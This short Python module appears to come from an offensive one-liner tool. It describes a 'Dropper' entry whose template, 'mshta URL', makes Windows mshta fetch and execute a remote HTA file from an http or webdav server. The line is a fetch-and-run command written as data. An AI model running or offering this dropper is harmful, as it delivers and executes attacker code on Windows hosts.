class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Uses mshta executable to download and execute your hta file from a http or webdav server."
    function    = "Dropper"
    liner       = "mshta URL"
